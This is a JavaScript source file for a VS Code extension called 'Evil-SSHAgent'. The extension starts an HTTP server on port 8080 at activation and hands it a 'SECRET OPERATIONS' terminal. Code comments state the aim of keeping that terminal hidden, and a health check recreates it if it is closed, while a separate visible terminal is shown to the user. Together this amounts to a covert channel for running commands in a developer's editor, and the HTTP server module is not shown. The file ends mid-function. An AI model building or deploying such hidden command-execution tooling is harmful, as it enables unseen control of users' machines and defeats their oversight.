// The module 'vscode' contains the VS Code extensibility API
// Import the module and reference it with the alias vscode in your code below
const vscode = require('vscode');
const { createHttpServer, setTerminalReferences } = require('./http-server/server');
const TerminalManager = require('./terminal/terminal-manager');
const logger = require('./utils/logger');

// 创建终端管理器实例
const terminalManager = new TerminalManager();

// 全局变量
let server = null;
let terminalCreated = false;
const PORT = 8080; // HTTP服务器端口

// 全局变量用于兼容 - 从TerminalManager获取managedTerminals的引用
let managedTerminals = terminalManager.managedTerminals;

// 全局变量用于存储预定义的终端ID
let mouseTerminalId = null;
let catTerminalId = null;

// 终端初始化状态标志
let terminalsInitialized = false;

// 终端创建锁，防止并发创建
let terminalCreationInProgress = false;

// 控制是否应该维持终端存活状态
let shouldMaintainTerminals = false;

// 从持久化存储恢复终端ID
function restoreTerminalIdsFromState() {
    try {
        const allTerminals = terminalManager.stateManager.getAllTerminals();
        logger.info(`从持久化存储加载了 ${Object.keys(allTerminals).length} 个终端状态`);
        logger.debug('持久化终端状态详情', allTerminals);
        
        // 查找mouse和cat终端
        for (const [terminalId, terminalInfo] of Object.entries(allTerminals)) {
            if (terminalInfo.type === 'mouse') {
                mouseTerminalId = terminalId;
                logger.info(`恢复Mouse终端ID: ${mouseTerminalId}`, terminalInfo);
            } else if (terminalInfo.type === 'cat') {
                catTerminalId = terminalId;
                logger.info(`恢复Cat终端ID: ${catTerminalId}`, terminalInfo);
            }
        }
        
        if (mouseTerminalId && catTerminalId) {
            logger.info(`成功恢复终端ID`, {
                mouseTerminalId: mouseTerminalId,
                catTerminalId: catTerminalId
            });
        } else {
            logger.warn('未找到完整的终端状态，将重新创建', {
                mouseTerminalId: mouseTerminalId,
                catTerminalId: catTerminalId
            });
        }
    } catch (error) {
        logger.error('恢复终端ID失败:', error);
        mouseTerminalId = null;
        catTerminalId = null;
    }
}

// This method is called when your extension is activated
// Your extension is activated the very first time the command is executed

/**
 * @param {vscode.ExtensionContext} context
 */
async function activate(context) {
	// 记录插件激活开始
	logger.info('Evil-SSHAgent HTTP Server extension is now active!');
	logger.info('=== 插件激活开始 ===');
	logger.debug('插件激活环境信息', {
		workingDirectory: process.cwd(),
		nodeVersion: process.version,
		vscodeVersion: vscode.version,
		extensionContext: context.extensionPath
	});
	
	// 测试HTTP服务器模块导入
	logger.debug('测试HTTP服务器模块导入...');
	logger.debug('模块导入状态', {
		createHttpServer: typeof createHttpServer,
		setTerminalReferences: typeof setTerminalReferences
	});
	
	if (typeof createHttpServer !== 'function') {
		logger.error('createHttpServer函数导入失败！');
		vscode.window.showErrorMessage('❌ HTTP服务器模块导入失败！');
		return;
	}
	logger.info('HTTP服务器模块导入成功');

	// 创建HTTP服务器
	function createHttpServerInstance() {
		logger.info(`正在创建HTTP服务器，端口: ${PORT}`);
		logger.debug('调用createHttpServer函数...');
		
		try {
			const serverInstance = createHttpServer(PORT);
			logger.info('createHttpServer函数调用成功，返回服务器实例');
			logger.debug('服务器实例信息', {
				type: typeof serverInstance,
				constructor: serverInstance.constructor.name
			});
			
			// 错误处理
			serverInstance.on('error', (error) => {
				logger.error('HTTP服务器错误:', error);
				vscode.window.showErrorMessage(`❌ HTTP服务器启动失败: ${error.message}`);
			});
			
			// 监听服务器启动事件
			serverInstance.on('listening', () => {
				logger.info(`HTTP服务器已成功启动，监听端口: ${PORT}`);
				vscode.window.showInformationMessage(`✅ HTTP服务器已成功启动，监听端口: ${PORT}`);
			});
			
			// 监听服务器关闭事件
			serverInstance.on('close', () => {
				console.log('HTTP服务器已关闭');
			});
			
			console.log('HTTP服务器事件监听器已设置');
			return serverInstance;
		} catch (error) {
			console.error('createHttpServer函数调用失败:', error);
			throw error;
		}
	}

	// 终端生命周期管理功能
	
	// 添加终端状态验证函数
	function validateTerminalExists(terminalId, terminalType) {
		if (!terminalId) {
			throw new Error(`${terminalType}终端ID为空，请确保插件已正确初始化`);
		}
		
		const terminalInfo = managedTerminals.get(terminalId);
		if (!terminalInfo) {
			throw new Error(`${terminalType}终端实例不存在，终端可能已被销毁`);
		}
		
		// 检查终端是否仍然有效
		if (!terminalInfo.terminal) {
			throw new Error(`${terminalType}终端对象无效，需要重新创建`);
		}
		
		// 检查终端是否在VS Code中真实存在
		if (!isTerminalAliveInVSCode(terminalInfo.terminal)) {
			throw new Error(`${terminalType}终端在VS Code中不存在，可能已被关闭`);
		}
		
		return true;
	}
	
	// 检查终端是否在VS Code中存活
	function isTerminalAliveInVSCode(terminal) {
		try {
			// 获取VS Code中所有终端
			const allTerminals = vscode.window.terminals;
			logger.debug('VS Code终端检查', {
				totalTerminals: allTerminals.length,
				terminalNames: allTerminals.map(t => t.name)
			});
			
			// 检查终端是否在VS Code的终端列表中
			const terminalExists = allTerminals.some(t => t === terminal);
			
			if (!terminalExists) {
				logger.warn('终端不在VS Code的终端列表中，可能已被关闭', {
					terminalName: terminal ? terminal.name : 'unknown',
					totalTerminals: allTerminals.length
				});
				return false;
			}
			
			// 尝试访问终端的基本属性来验证其有效性
			try {
				const name = terminal.name;
				const processId = terminal.processId;
				logger.debug(`终端验证通过 - 名称: ${name}, 进程ID: ${processId}`);
				return true;
			} catch (error) {
				logger.warn('无法访问终端属性，终端可能已失效:', {
					error: error.message,
					terminalName: terminal ? terminal.name : 'unknown'
				});
				return false;
			}
		} catch (error) {
			logger.error('检查终端存活状态时出错:', {
				error: error.message,
				terminalName: terminal ? terminal.name : 'unknown'
			});
			return false;
		}
	}
	
	// 检查mouse终端是否意外显示
	function ensureMouseTerminalHidden(terminalId, terminalType) {
		try {
			const terminalInfo = managedTerminals.get(terminalId);
			if (!terminalInfo || !terminalInfo.terminal) {
				return;
			}
			
			// 检查终端是否在VS Code中存活
			if (!isTerminalAliveInVSCode(terminalInfo.terminal)) {
				return;
			}
			
			// 对于mouse终端，确保它保持隐藏状态
			if (terminalType === 'Mouse' || terminalInfo.type === 'mouse') {
				// 不调用show()方法，确保终端保持隐藏
				console.log(`✓ ${terminalType}终端保持隐藏状态`);
				
				// 可选：检查终端是否意外显示（通过检查VS Code的终端面板状态）
				// 注意：VS Code API 不直接提供检查终端是否显示的方法
				// 我们只能通过不调用show()来确保隐藏状态
			}
		} catch (error) {
			console.warn(`检查${terminalType}终端显示状态时出错:`, error.message);
		}
	}
	
	// 检查VS Code中是否已存在相同类型的终端
	function findExistingTerminalInVSCode(terminalType) {
		try {
			const allTerminals = vscode.window.terminals;
			console.log(`检查VS Code中的 ${allTerminals.length} 个终端...`);
			
			// 根据终端类型查找匹配的终端
			for (const terminal of allTerminals) {
				try {
					const name = terminal.name;
					const processId = terminal.processId;
					
					// 检查终端名称是否匹配我们的命名模式
					if (terminalType === 'mouse' && name.includes('MOUSE')) {
						console.log(`找到现有的Mouse终端: ${name} (PID: ${processId})`);
						return terminal;
					} else if (terminalType === 'cat' && name.includes('CAT')) {
						console.log(`找到现有的Cat终端: ${name} (PID: ${processId})`);
						return terminal;
					}
				} catch (error) {
					// 忽略无法访问的终端
					continue;
				}
			}
			
			console.log(`未找到现有的${terminalType}终端`);
			return null;
		} catch (error) {
			console.error('检查VS Code中现有终端时出错:', error);
			return null;
		}
	}
	
	// 尝试恢复已存在的终端到管理列表
	function tryRecoverExistingTerminal(terminalType, terminalId) {
		try {
			const existingTerminal = findExistingTerminalInVSCode(terminalType);
			if (existingTerminal) {
				console.log(`尝试恢复现有的${terminalType}终端到管理列表...`);
				
				// 创建终端信息对象
				const terminalInfo = {
					terminal: existingTerminal,
					type: terminalType,
					createdTime: new Date().toISOString(),
					lastActivity: new Date().toISOString(),
					name: `${terminalType.toUpperCase()} TERMINAL (RECOVERED)`
				};
				
				// 添加到管理列表
				managedTerminals.set(String(terminalId), terminalInfo);
				
				// 更新状态管理器
				terminalManager.stateManager.upsertTerminal(terminalId, {
					type: terminalType,
					createdTime: terminalInfo.createdTime,
					lastActivity: terminalInfo.lastActivity,
					name: terminalInfo.name
				});
				
				console.log(`✓ 成功恢复${terminalType}终端 [ID: ${terminalId}]`);
				return true;
			}
			return false;
		} catch (error) {
			console.error(`恢复${terminalType}终端失败:`, error);
			return false;
		}
	}
	
	// 创建远程终端（mouse）
	async function createRemoteTerminal(type = 'mouse', sendWelcome = false) {
		return terminalManager.createRemoteTerminal(type, sendWelcome);
	}

	// 创建本地终端（cat） - 真正的本地终端
	async function createLocalTerminal(type = 'cat', sendWelcome = true) {
		return terminalManager.createLocalTerminal(type, sendWelcome);
	}
	
	// 智能命令发送函数 - 自动确保终端存在
	async function sendCommandToTerminal(terminalId, command, clearAfterExecution = true, redirectOutput = true) {
		try {
			// 检查终端是否真的存在
			if (!terminalsInitialized || !mouseTerminalId || !catTerminalId) {
				console.log('终端未初始化，开始初始化...');
				await ensureTerminalsExist();
			}
			
			// 如果指定的终端ID不存在，使用默认的mouse终端
			if (!terminalId || !managedTerminals.get(terminalId)) {
				console.log(`终端 ${terminalId} 不存在，使用默认mouse终端`);
				terminalId = mouseTerminalId;
			}
			
			// 验证终端存在性
			validateTerminalExists(terminalId, '指定');
			
			return await terminalManager.sendCommandToTerminal(terminalId, command, clearAfterExecution, redirectOutput);
		} catch (error) {
			console.error('向终端发送命令失败:', error);
			vscode.window.showErrorMessage(`终端命令发送失败: ${error.message}`);
			throw error;
		}
	}

	// 向mouse终端发送命令（自动确保终端存在）
	async function sendCommandToMouseTerminal(command, clearAfterExecution = true, redirectOutput = true) {
		try {
			// 检查终端是否真的存在
			if (!terminalsInitialized || !mouseTerminalId || !managedTerminals.get(String(mouseTerminalId))) {
				console.log('Mouse终端不存在或无效，重新创建...');
				await ensureTerminalsExist();
			}
			
			// 验证终端存在性（包括VS Code API检查）
			validateTerminalExists(mouseTerminalId, 'Mouse');
			
			// 确保mouse终端保持隐藏状态
			ensureMouseTerminalHidden(mouseTerminalId, 'Mouse');
			
			return await terminalManager.sendCommandToTerminal(mouseTerminalId, command, clearAfterExecution, redirectOutput);
		} catch (error) {
			console.error('向Mouse终端发送命令失败:', error);
			vscode.window.showErrorMessage(`Mouse终端命令发送失败: ${error.message}`);
			throw error;
		}
	}

	// 向cat终端发送命令（自动确保终端存在）
	async function sendCommandToCatTerminal(command, clearAfterExecution = true, redirectOutput = true) {
		try {
			// 检查终端是否真的存在
			if (!terminalsInitialized || !catTerminalId || !managedTerminals.get(String(catTerminalId))) {
				console.log('Cat终端不存在或无效，重新创建...');
				await ensureTerminalsExist();
			}
			
			// 验证终端存在性
			validateTerminalExists(catTerminalId, 'Cat');
			
			return await terminalManager.sendCommandToTerminal(catTerminalId, command, clearAfterExecution, redirectOutput);
		} catch (error) {
			console.error('向Cat终端发送命令失败:', error);
			vscode.window.showErrorMessage(`Cat终端命令发送失败: ${error.message}`);
			throw error;
		}
	}
	
	// 销毁所有管理的终端
	async function destroyAllManagedTerminals() {
		return terminalManager.destroyAllManagedTerminals();
	}
	
	// 获取终端状态信息
	function getTerminalStatus() {
		return terminalManager.getTerminalStatus();
	}
	
	// 清理空闲终端（超过指定时间未活动）
	async function cleanupIdleTerminals(maxIdleTimeMs = 300000) { // 默认5分钟
		return terminalManager.cleanupIdleTerminals(maxIdleTimeMs);
	}
	
	// 创建默认远程终端的函数 (保留原有功能，但现在使用管理系统)
	async function createDefaultRemoteTerminal() {
		try {
			const terminalId = await createRemoteTerminal('default', true);
			vscode.window.showInformationMessage(`✅ 远程终端创建成功 [ID: ${terminalId}]`);
		} catch (error) {
			console.error('❌ 创建远程终端失败:', error);
			vscode.window.showErrorMessage('❌ 创建远程终端失败: ' + error.message);
		}
	}

	// 注册命令 - 启动服务器命令（用于手动重启）
	const startServerCommand = vscode.commands.registerCommand('evil-sshagent.startServer', () => {
		if (!server || !server.listening) {
			server = createHttpServerInstance();
			shouldMaintainTerminals = true;
			
			// 启动健康检查机制
			startTerminalHealthCheck();
			logger.info('已启动终端健康检查，开始维持终端存活状态');
			
			vscode.window.showInformationMessage('🚀 HTTP服务器已启动，终端健康检查已开启');
		} else {
			vscode.window.showWarningMessage('⚠️ HTTP服务器已在运行');
		}
	});

	// 注册命令 - 停止服务器命令
	const stopServerCommand = vscode.commands.registerCommand('evil-sshagent.stopServer', () => {
		if (server && server.listening) {
			server.close(() => {
				logger.info('HTTP服务器已停止');
				vscode.window.showInformationMessage('🛑 HTTP服务器已停止');
			});
			server = null;
			
			// 停止健康检查机制
			stopTerminalHealthCheck();
			shouldMaintainTerminals = false;
			logger.info('已停止终端健康检查，不再维持终端存活状态');
			
			vscode.window.showInformationMessage('🛑 HTTP服务器已停止，终端健康检查已关闭');
		} else {
			vscode.window.showWarningMessage('⚠️ HTTP服务器未运行');
		}
	});

	const createTerminalCommand = vscode.commands.registerCommand('evil-sshagent.createRemoteTerminal', async () => {
		await createDefaultRemoteTerminal();
	});

	// 新增：显示终端状态命令
	const showTerminalStatusCommand = vscode.commands.registerCommand('evil-sshagent.showTerminalStatus', () => {
		const status = getTerminalStatus();
		console.log('终端状态:', status);
		
		const statusMessage = `📊 终端状态: 共 ${status.totalTerminals} 个终端\n` +
			status.terminals.map(t => 
				`  [ID: ${t.id}] 类型: ${t.type}, 活动: ${t.isActive ? '是' : '否'}`
			).join('\n');
		
		vscode.window.showInformationMessage(statusMessage);
	});

	// 新增：清理空闲终端命令
	const cleanupIdleTerminalsCommand = vscode.commands.registerCommand('evil-sshagent.cleanupIdleTerminals', async () => {
		const cleanedCount = await cleanupIdleTerminals();
		vscode.window.showInformationMessage(`🧹 已清理 ${cleanedCount} 个空闲终端`);
	});

	// 新增：销毁所有终端命令
	const destroyAllTerminalsCommand = vscode.commands.registerCommand('evil-sshagent.destroyAllTerminals', async () => {
		const destroyedCount = await destroyAllManagedTerminals();
		vscode.window.showInformationMessage(`💥 已销毁 ${destroyedCount} 个终端`);
	});

	// 新增：显示命令日志文件路径命令
	const showCommandLogPathCommand = vscode.commands.registerCommand('evil-sshagent.showCommandLogPath', () => {
		const logPath = terminalManager.getCommandLogPath();
		vscode.window.showInformationMessage(`📝 命令日志文件路径: ${logPath}`);
	});

	// 新增：显示详细调试日志文件路径命令
	const showDebugLogPathCommand = vscode.commands.registerCommand('evil-sshagent.showDebugLogPath', () => {
		const debugLogPath = logger.getLogFilePath();
		const debugLogDir = logger.getLogDirPath();
		vscode.window.showInformationMessage(
			`🔍 详细调试日志文件路径: ${debugLogPath}\n📁 日志目录: ${debugLogDir}`
		);
		logger.info('用户查看调试日志路径', { debugLogPath, debugLogDir });
	});

	// 新增：检查持久化存储状态命令
	const checkPersistentStorageCommand = vscode.commands.registerCommand('evil-sshagent.checkPersistentStorage', () => {
		try {
			const allTerminals = terminalManager.stateManager.getAllTerminals();
			const stateFilePath = terminalManager.stateManager.getStateFilePath();
			const fileExists = require('fs').existsSync(stateFilePath);
			
			logger.info('检查持久化存储状态', {
				stateFilePath: stateFilePath,
				fileExists: fileExists,
				terminalsCount: Object.keys(allTerminals).length,
				terminals: allTerminals,
				mouseTerminalId: mouseTerminalId,
				catTerminalId: catTerminalId,
				terminalsInitialized: terminalsInitialized
			});
			
			vscode.window.showInformationMessage(
				`📊 持久化存储状态:\n` +
				`- 文件路径: ${stateFilePath}\n` +
				`- 文件存在: ${fileExists ? '是' : '否'}\n` +
				`- 终端数量: ${Object.keys(allTerminals).length}\n` +
				`- Mouse终端ID: ${mouseTerminalId || 'null'}\n` +
				`- Cat终端ID: ${catTerminalId || 'null'}\n` +
				`- 终端已初始化: ${terminalsInitialized ? '是' : '否'}`
			);
		} catch (error) {
			logger.error('检查持久化存储状态失败:', error);
			vscode.window.showErrorMessage('检查持久化存储状态失败: ' + error.message);
		}
	});

	// 新增：测试插件状态命令
	const testPluginStatusCommand = vscode.commands.registerCommand('evil-sshagent.testPluginStatus', () => {
		console.log('=== 测试插件状态 ===');
		
		// 检查HTTP服务器状态
		const serverStatus = server && server.listening ? '✅ 运行中' : '❌ 未运行';
		console.log(`HTTP服务器状态: ${serverStatus}`);
		
		// 检查终端状态
		const terminalStatus = getTerminalStatus();
		console.log(`终端状态: 共 ${terminalStatus.totalTerminals} 个终端`);
		
		// 检查mouse和cat终端
		const mouseStatus = mouseTerminalId ? `✅ 已创建 (ID: ${mouseTerminalId})` : '❌ 未创建';
		const catStatus = catTerminalId ? `✅ 已创建 (ID: ${catTerminalId})` : '❌ 未创建';
		
		// 检查健康检查状态
		const healthCheckStatus = terminalHealthCheckInterval ? '✅ 运行中' : '❌ 未运行';
		
		const statusMessage = `🔍 插件状态检查:\n` +
			`- HTTP服务器: ${serverStatus}\n` +
			`- Mouse终端: ${mouseStatus}\n` +
			`- Cat终端: ${catStatus}\n` +
			`- 总终端数: ${terminalStatus.totalTerminals}\n` +
			`- 健康检查: ${healthCheckStatus}`;
		
		vscode.window.showInformationMessage(statusMessage);
		console.log('插件状态检查完成');
	});

	// 新增：手动触发终端健康检查命令
	const triggerHealthCheckCommand = vscode.commands.registerCommand('evil-sshagent.triggerHealthCheck', async () => {
		console.log('=== 手动触发终端健康检查 ===');
		
		try {
			await ensureTerminalsExist();
			vscode.window.showInformationMessage('✅ 终端健康检查完成，所有终端状态正常');
			console.log('✅ 手动健康检查完成');
		} catch (error) {
			console.error('❌ 手动健康检查失败:', error);
			vscode.window.showErrorMessage('❌ 终端健康检查失败: ' + error.message);
		}
	});

	// Hello World命令 - 智能命令发送（自动确保终端存在）
	const helloWorldCommand = vscode.commands.registerCommand('evil-sshagent.helloWorld', async function () {
		logger.info('Hello World命令被调用 - 智能命令发送');
		
		try {
			// 检查终端状态，但不重复创建
			logger.debug('检查终端状态...');
			if (!terminalsInitialized || !mouseTerminalId || !catTerminalId) {
				logger.info('终端未初始化，开始初始化...');
				await ensureTerminalsExist();
			}
			
			// 向mouse终端发送命令（自动确保终端存在）
			console.log('向mouse终端发送命令...');
			await sendCommandToMouseTerminal("echo '=== REMOTE TERMINAL (MOUSE) - SECRET OPERATIONS ===' ", false);
			await sendCommandToMouseTerminal("whoami", false);
			await sendCommandToMouseTerminal("echo 'Remote terminal operations completed'", false);
			await sendCommandToMouseTerminal("clear", false);
			console.log('✓ Mouse终端命令已发送');
			
			// 向cat终端发送命令（自动确保终端存在）
			console.log('向cat终端发送命令...');
			await sendCommandToCatTerminal("echo '=== LOCAL TERMINAL (CAT) - OPERATIONS START ===' ");
			await sendCommandToCatTerminal("date");
			await sendCommandToCatTerminal("echo 'Local terminal operations completed'");
			console.log('✓ Cat终端命令已发送');
			
			// 确保cat终端可见
			try {
				validateTerminalExists(catTerminalId, 'Cat');
				const catTerminalInfo = managedTerminals.get(String(catTerminalId));
				if (catTerminalInfo && catTerminalInfo.terminal) {
					catTerminalInfo.terminal.show();
					console.log('✓ Cat终端已设置为活动状态');
				}
			} catch (error) {
				console.warn('无法显示Cat终端:', error.message);
			}
			
			vscode.window.showInformationMessage(`👋 Hello World! 命令已成功发送到终端`);
		} catch (error) {
			console.error('Hello World命令执行失败:', error);
			vscode.window.showErrorMessage('❌ Hello World命令执行失败: ' + error.message);
			
			// 提供更详细的错误信息和解决建议
			if (error.message.includes('终端ID为空')) {
				vscode.window.showErrorMessage('💡 建议：请尝试重新加载插件或手动创建终端');
			} else if (error.message.includes('终端实例不存在')) {
				vscode.window.showErrorMessage('💡 建议：终端可能已被销毁，请重新创建终端');
			}
		}
	});

	// 将命令添加到订阅中
	context.subscriptions.push(startServerCommand);
	context.subscriptions.push(stopServerCommand);
	context.subscriptions.push(createTerminalCommand);
	context.subscriptions.push(showTerminalStatusCommand);
	context.subscriptions.push(cleanupIdleTerminalsCommand);
	context.subscriptions.push(destroyAllTerminalsCommand);
	context.subscriptions.push(showCommandLogPathCommand);
	context.subscriptions.push(showDebugLogPathCommand);
	context.subscriptions.push(checkPersistentStorageCommand);
	context.subscriptions.push(testPluginStatusCommand);
	context.subscriptions.push(triggerHealthCheckCommand);
	context.subscriptions.push(helloWorldCommand);

	// 终端生命周期管理函数
	async function ensureTerminalsExist() {
		// 防止并发创建终端
		if (terminalCreationInProgress) {
			logger.info('终端创建正在进行中，等待完成...');
			// 等待当前创建完成
			while (terminalCreationInProgress) {
				await new Promise(resolve => setTimeout(resolve, 100));
			}
			logger.info('等待终端创建完成，返回现有终端ID');
			return { mouseTerminalId, catTerminalId };
		}
		
		// 如果终端已经初始化且存在，进行深度检查
		if (terminalsInitialized && mouseTerminalId && catTerminalId) {
			logger.debug('开始深度检查终端状态', {
				terminalsInitialized: terminalsInitialized,
				mouseTerminalId: mouseTerminalId,
				catTerminalId: catTerminalId,
				managedTerminalsSize: managedTerminals.size
			});
			
			try {
				const mouseExists = managedTerminals.get(String(mouseTerminalId));
				const catExists = managedTerminals.get(String(catTerminalId));
				
				logger.debug('从managedTerminals获取终端信息', {
					mouseExists: mouseExists ? {
						id: mouseExists.id,
						type: mouseExists.type,
						terminal: mouseExists.terminal ? 'exists' : 'null',
						createdAt: mouseExists.createdAt
					} : 'null',
					catExists: catExists ? {
						id: catExists.id,
						type: catExists.type,
						terminal: catExists.terminal ? 'exists' : 'null',
						createdAt: catExists.createdAt
					} : 'null'
				});
				
				if (mouseExists && catExists) {
					// 深度检查：验证终端是否在VS Code中真实存在
					logger.debug('开始检查终端在VS Code中的存活状态');
					const mouseAlive = isTerminalAliveInVSCode(mouseExists.terminal);
					const catAlive = isTerminalAliveInVSCode(catExists.terminal);
					
					logger.debug('VS Code终端存活状态检查结果', {
						mouseAlive: mouseAlive,
						catAlive: catAlive,
						vscodeTerminalsCount: vscode.window.terminals.length,
						vscodeTerminalNames: vscode.window.terminals.map(t => t.name)
					});
					
					if (mouseAlive && catAlive) {
						logger.info('终端已存在且有效，跳过检查');
						
						// 确保mouse终端保持隐藏状态
						ensureMouseTerminalHidden(mouseTerminalId, 'Mouse');
						
						return { mouseTerminalId, catTerminalId };
					} else {
						logger.warn('终端在VS Code中不存在，需要重新创建', {
							mouseAlive: mouseAlive,
							catAlive: catAlive,
							mouseTerminalId: mouseTerminalId,
							catTerminalId: catTerminalId,
							mouseTerminalProcessId: mouseExists.terminal ? mouseExists.terminal.processId : 'null',
							catTerminalProcessId: catExists.terminal ? catExists.terminal.processId : 'null'
						});
						if (!mouseAlive) logger.warn('Mouse终端已失效');
						if (!catAlive) logger.warn('Cat终端已失效');
					}
				} else {
					logger.warn('终端引用不存在于managedTerminals中', {
						mouseExists: !!mouseExists,
						catExists: !!catExists,
						mouseTerminalId: mouseTerminalId,
						catTerminalId: catTerminalId,
						allManagedTerminalIds: Array.from(managedTerminals.keys())
					});
				}
			} catch (error) {
				logger.error('检查终端状态时出错，将重新创建终端:', error);
			}
		} else {
			logger.debug('终端未初始化或ID为空，将创建新终端', {
				terminalsInitialized: terminalsInitialized,
				mouseTerminalId: mouseTerminalId,
				catTerminalId: catTerminalId
			});
		}
		
		// 设置创建锁
		terminalCreationInProgress = true;
		
		try {
			logger.info('=== 检查终端生命周期 ===');
			
			// 检查mouse终端是否存在
		if (!mouseTerminalId) {
			logger.info('Mouse终端不存在，开始创建...');
			try {
				mouseTerminalId = await createRemoteTerminal('mouse', true);
				logger.info(`Mouse终端创建成功 [ID: ${mouseTerminalId}]`);
			} catch (error) {
				logger.error('Mouse终端创建失败:', error);
				vscode.window.showErrorMessage(`Mouse终端创建失败: ${error.message}`);
				throw new Error(`Mouse终端创建失败: ${error.message}`);
			}
		} else {
			logger.info(`Mouse终端已存在 [ID: ${mouseTerminalId}]`);
			// 验证终端是否仍然有效
			const mouseTerminalInfo = managedTerminals.get(String(mouseTerminalId));
			if (!mouseTerminalInfo) {
				logger.warn('Mouse终端引用丢失，尝试恢复...');
				
				// 尝试恢复已存在的终端
				const recovered = tryRecoverExistingTerminal('mouse', mouseTerminalId);
				if (!recovered) {
					logger.warn('无法恢复Mouse终端，重新创建...');
					try {
						mouseTerminalId = await createRemoteTerminal('mouse', true);
						logger.info(`Mouse终端重新创建成功 [ID: ${mouseTerminalId}]`);
					} catch (error) {
						logger.error('Mouse终端重新创建失败:', error);
						vscode.window.showErrorMessage(`Mouse终端重新创建失败: ${error.message}`);
						throw new Error(`Mouse终端重新创建失败: ${error.message}`);
					}
				} else {
					logger.info('Mouse终端恢复成功');
				}
			}
		}
		
		// 检查cat终端是否存在
		if (!catTerminalId) {
			console.log('Cat终端不存在，开始创建...');
			try {
				catTerminalId = await createLocalTerminal('cat', true);
				console.log(`✓ Cat终端创建成功 [ID: ${catTerminalId}]`);
			} catch (error) {
				console.error('❌ Cat终端创建失败:', error);
				vscode.window.showErrorMessage(`Cat终端创建失败: ${error.message}`);
				throw new Error(`Cat终端创建失败: ${error.message}`);
			}
		} else {
			console.log(`Cat终端已存在 [ID: ${catTerminalId}]`);
			// 验证终端是否仍然有效
			const catTerminalInfo = managedTerminals.get(String(catTerminalId));
			if (!catTerminalInfo) {
				console.log('Cat终端引用丢失，尝试恢复...');
				
				// 尝试恢复已存在的终端
				const recovered = tryRecoverExistingTerminal('cat', catTerminalId);
				if (!recovered) {
					console.log('无法恢复Cat终端，重新创建...');
					try {
						catTerminalId = await createLocalTerminal('cat', true);
						console.log(`✓ Cat终端重新创建成功 [ID: ${catTerminalId}]`);
					} catch (error) {
						console.error('❌ Cat终端重新创建失败:', error);
						vscode.window.showErrorMessage(`Cat终端重新创建失败: ${error.message}`);
						throw new Error(`Cat终端重新创建失败: ${error.message}`);
					}
				}
			}
		}
		
		// 确保cat终端可见
		try {
			const catTerminalInfo = managedTerminals.get(String(catTerminalId));
			if (catTerminalInfo && catTerminalInfo.terminal) {
				catTerminalInfo.terminal.show();
				console.log(`✓ Cat终端已设置为活动状态`);
			}
		} catch (error) {
			console.warn('无法显示Cat终端:', error.message);
		}
		
		// 设置HTTP服务器的终端引用
		try {
			setTerminalReferences(terminalManager, mouseTerminalId);
			console.log('✓ 终端引用已设置到HTTP服务器');
		} catch (error) {
			console.warn('设置HTTP服务器终端引用失败:', error.message);
		}
		
			// 标记终端已初始化
			terminalsInitialized = true;
			
			console.log(`✅ 终端初始化完成 - Mouse: ${mouseTerminalId}, Cat: ${catTerminalId}`);
			return { mouseTerminalId, catTerminalId };
		} catch (error) {
			console.error('终端创建过程中出错:', error);
			throw error;
		} finally {
			// 释放创建锁
			terminalCreationInProgress = false;
		}
	}

	// 插件完整启动序列
	async function initializePlugin() {
		logger.info('=== 开始插件完整初始化 ===');
		
		try {
			// 第一步：启动HTTP服务器
			logger.info('步骤1: 启动HTTP服务器...');
			server = createHttpServerInstance();
			shouldMaintainTerminals = true; // 设置应该维持终端存活状态
			logger.info('✓ HTTP服务器启动函数已调用');
			
			// 等待HTTP服务器完全启动
			await new Promise((resolve, reject) => {
				const checkServer = () => {
					if (server && server.listening) {
						console.log('✅ HTTP服务器已成功启动，监听端口: ' + PORT);
						resolve();
					} else {
						setTimeout(checkServer, 100);
					}
				};
				setTimeout(checkServer, 100);
			});
			
			// 第二步：确保终端存在
			console.log('步骤2: 检查和创建终端...');
			const terminals = await ensureTerminalsExist();
			
			// 第三步：显示启动成功信息
			console.log('步骤3: 显示启动信息...');
			const logPath = terminalManager.getCommandLogPath();
			vscode.window.showInformationMessage(
				`✅ Evil-SSHAgent 插件已完全激活！\n` +
				`- HTTP服务器: http://localhost:${PORT}\n` +
				`- Mouse终端: ${terminals.mouseTerminalId}\n` +
				`- Cat终端: ${terminals.catTerminalId}\n` +
				`- 命令日志: ${logPath}`
			);
			
			console.log('✅ 插件初始化完成');
			
		} catch (error) {
			console.error('❌ 插件初始化失败:', error);
			vscode.window.showErrorMessage('❌ 插件初始化失败: ' + error.message);
			
			// 如果初始化失败，至少确保HTTP服务器可以工作
			if (server && server.listening) {
				vscode.window.showWarningMessage('⚠️ HTTP服务器已启动，但终端初始化失败。请手动创建终端或重启插件。');
			}
		}
	}

	// 终端健康检查机制
	let terminalHealthCheckInterval = null;
	
	function startTerminalHealthCheck() {
		logger.info('启动终端健康检查机制...');
		
		// 每60秒检查一次终端状态（减少检查频率）
		terminalHealthCheckInterval = setInterval(async () => {
			try {
				logger.info('=== 执行终端健康检查 ===');
				logger.debug('健康检查状态', {
					terminalsInitialized,
					mouseTerminalId,
					catTerminalId,
					managedTerminalsSize: managedTerminals.size,
					shouldMaintainTerminals
				});
				
				// 检查是否应该维持终端存活状态
				if (!shouldMaintainTerminals) {
					logger.info('不需要维持终端存活状态，跳过健康检查');
					return;
				}
				
				// 只有在终端未初始化时才创建
				if (!terminalsInitialized) {
					logger.info('终端未初始化，跳过健康检查');
					return;
				}
				
				// 检查mouse终端
				if (!mouseTerminalId || !managedTerminals.get(String(mouseTerminalId))) {
					logger.warn('Mouse终端健康检查失败，重新创建...', {
						mouseTerminalId,
						hasManagedTerminal: !!managedTerminals.get(String(mouseTerminalId))
					});
					mouseTerminalId = await createRemoteTerminal('mouse', true);
					setTerminalReferences(terminalManager, mouseTerminalId);
					logger.info(`Mouse终端重新创建成功 [ID: ${mouseTerminalId}]`);
				} else {
					// 深度检查：验证终端是否在VS Code中真实存在
					const mouseTerminalInfo = managedTerminals.get(String(mouseTerminalId));
					logger.debug('Mouse终端健康检查详情', {
						terminalId: mouseTerminalId,
						hasTerminalInfo: !!mouseTerminalInfo,
						hasTerminal: !!(mouseTerminalInfo && mouseTerminalInfo.terminal)
					});
					
					if (mouseTerminalInfo && isTerminalAliveInVSCode(mouseTerminalInfo.terminal)) {
						logger.info('Mouse终端健康检查通过');
						// 确保mouse终端保持隐藏状态
						ensureMouseTerminalHidden(mouseTerminalId, 'Mouse');
					} else {
						logger.warn('Mouse终端在VS Code中不存在，重新创建...', {
							terminalId: mouseTerminalId,
							hasTerminalInfo: !!mouseTerminalInfo,
							terminalAlive: mouseTerminalInfo ? isTerminalAliveInVSCode(mouseTerminalInfo.terminal) : false
						});
						mouseTerminalId = await createRemoteTerminal('mouse', true);
